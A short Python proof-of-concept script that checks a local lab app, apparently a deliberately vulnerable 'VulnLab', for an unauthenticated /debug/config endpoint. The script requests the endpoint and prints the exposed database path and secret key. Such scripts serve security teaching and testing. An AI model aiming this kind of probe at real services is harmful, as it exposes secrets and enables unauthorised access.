import requests

BASE_URL = "http://127.0.0.1:5000"
TIMEOUT = 5

def main():
    health = requests.get(
        f"{BASE_URL}/health",
        timeout=TIMEOUT,
    )
    health.raise_for_status()

    print("[+] VulnLab health check passed")
    response = requests.get(
        f"{BASE_URL}/debug/config",
        timeout=TIMEOUT,
    )
    response.raise_for_status()

    exposed = response.json()

    required_fields = {
        "database_path", "secret_key",
    }

    missing_fields = required_fields - exposed.keys()
    if missing_fields:
        raise RuntimeError(
            f"Expected fields were not exposed: {missing_fields}"
        )

    database_path = exposed["database_path"]
    secret_key = exposed["secret_key"]
    if not database_path or not secret_key:
        raise RuntimeError(
            "Exposed configuration values were empty"
        )

    print("[+] Diagnostic endpoint is reachable without authentication")
    print("[+] Sensitive configuration exposure confirmed")
    print(f"    Database path: {database_path}")
    print(f"    (Fictional) Secret key: {str(secret_key)}")

    return 0

if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except requests.RequestException as error:
        print(f"[-] HTTP request failed: {error}")
        raise SystemExit(1)
    except (RuntimeError, ValueError) as error:
        print(f"[-] PoC failed: {error}")
        raise SystemExit(1)